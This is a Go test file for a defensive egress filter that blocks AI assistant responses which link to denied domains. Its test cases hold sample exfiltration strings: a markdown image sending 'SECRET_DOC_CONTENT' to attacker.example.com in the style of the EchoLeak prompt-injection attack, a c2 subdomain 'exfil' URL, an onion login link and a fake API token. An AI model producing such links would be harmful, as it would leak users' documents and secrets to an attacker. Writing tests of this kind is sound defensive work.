package pipeline

import (
	"strings"
	"testing"

	"github.com/Yashash4/reef-mcp-registry/lobstertrap-reef/internal/audit"
	"github.com/Yashash4/reef-mcp-registry/lobstertrap-reef/internal/policy"
)

// minimalPolicy returns a policy with no ingress/egress rules other than the
// minimum required to satisfy the validator, parameterised over the
// network.denied_domains list. This isolates the runtime denied_domains
// enforcement path from any other egress rule that might otherwise fire on
// the synthetic response text.
func minimalPolicy(denied []string) *policy.Policy {
	return &policy.Policy{
		Version:       "test",
		PolicyName:    "denied_domains_test",
		DefaultAction: policy.ActionAllow,
		IngressRules:  nil,
		EgressRules:   nil,
		Network: policy.NetworkPolicy{
			EgressPolicy:  "allowlist",
			DeniedDomains: denied,
		},
	}
}

func TestProcessEgress_DeniedDomains_EchoLeakMarkdownImage(t *testing.T) {
	cases := []struct {
		name        string
		denied      []string
		response    string
		wantBlocked bool
		wantRule    string
		wantHostIn  string // substring expected inside the DenyMessage
	}{
		{
			name:        "EchoLeak markdown image to denied host blocked",
			denied:      []string{"attacker.example.com"},
			response:    "Sure, here is the summary ![](https://attacker.example.com/log?d=SECRET_DOC_CONTENT).",
			wantBlocked: true,
			wantRule:    ReasonBlockedDeniedDomain,
			wantHostIn:  "attacker.example.com",
		},
		{
			name:        "wildcard subdomain pattern matches subdomain",
			denied:      []string{"*.attacker.example.com"},
			response:    "![](https://c2.attacker.example.com/exfil?d=secret)",
			wantBlocked: true,
			wantRule:    ReasonBlockedDeniedDomain,
			wantHostIn:  "c2.attacker.example.com",
		},
		{
			name:        "onion wildcard matches",
			denied:      []string{"*.onion"},
			response:    "Please open http://abc123.onion/login to continue.",
			wantBlocked: true,
			wantRule:    ReasonBlockedDeniedDomain,
			wantHostIn:  "abc123.onion",
		},
		{
			name:        "exact pattern does not match unrelated host",
			denied:      []string{"attacker.example.com"},
			response:    "See https://api.openai.com/v1/models for details.",
			wantBlocked: false,
		},
		{
			name:        "no denied_domains configured: no block from this path",
			denied:      nil,
			response:    "See https://attacker.example.com/log?d=secret",
			wantBlocked: false,
		},
		{
			name:        "response without URLs is unaffected",
			denied:      []string{"attacker.example.com"},
			response:    "The capital of France is Paris.",
			wantBlocked: false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pol := minimalPolicy(tc.denied)
			pipe := New(pol, audit.NopLogger())

			pr := pipe.ProcessIngress("Summarise my inbox", nil)
			if pr.Blocked {
				t.Fatalf("unexpected ingress block: %s", pr.DenyMessage)
			}

			pipe.ProcessEgress(pr, tc.response)

			if pr.Blocked != tc.wantBlocked {
				t.Fatalf("Blocked = %v, want %v (egress action %s, rule %q)",
					pr.Blocked, tc.wantBlocked, pr.EgressResult.Action, pr.EgressResult.RuleName)
			}
			if !tc.wantBlocked {
				return
			}
			if pr.BlockedAt != "egress" {
				t.Errorf("BlockedAt = %q, want \"egress\"", pr.BlockedAt)
			}
			if pr.EgressResult.Action != policy.ActionDeny {
				t.Errorf("EgressResult.Action = %s, want DENY", pr.EgressResult.Action)
			}
			if pr.EgressResult.RuleName != tc.wantRule {
				t.Errorf("EgressResult.RuleName = %q, want %q", pr.EgressResult.RuleName, tc.wantRule)
			}
			if tc.wantHostIn != "" && !strings.Contains(pr.DenyMessage, tc.wantHostIn) {
				t.Errorf("DenyMessage = %q, expected to contain %q", pr.DenyMessage, tc.wantHostIn)
			}
		})
	}
}

// TestProcessEgress_DeniedDomains_DoesNotOverrideExplicitDeny verifies that a
// pre-existing egress rule that already returns DENY/QUARANTINE wins over the
// generic denied_domains override — so audits show the more specific rule.
func TestProcessEgress_DeniedDomains_DoesNotOverrideExplicitDeny(t *testing.T) {
	pol := &policy.Policy{
		Version:       "test",
		PolicyName:    "denied_domains_precedence",
		DefaultAction: policy.ActionAllow,
		EgressRules: []policy.GuardRule{
			{
				Name:        "block_credential_leak",
				Priority:    100,
				Action:      policy.ActionDeny,
				DenyMessage: "credential leak",
				Conditions: []policy.MatchCondition{
					{Field: "contains_credentials", MatchType: policy.MatchBoolean, Value: true},
				},
			},
		},
		Network: policy.NetworkPolicy{
			DeniedDomains: []string{"attacker.example.com"},
		},
	}
	pipe := New(pol, audit.NopLogger())
	pr := pipe.ProcessIngress("ok", nil)
	// Response triggers BOTH the credential-leak rule AND a denied-domain reference.
	pipe.ProcessEgress(pr, "Here is your token: sk-AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH and visit https://attacker.example.com/log")

	if !pr.Blocked {
		t.Fatal("expected egress block")
	}
	if pr.EgressResult.RuleName != "block_credential_leak" {
		t.Errorf("RuleName = %q, want pre-existing DENY rule to win", pr.EgressResult.RuleName)
	}
}
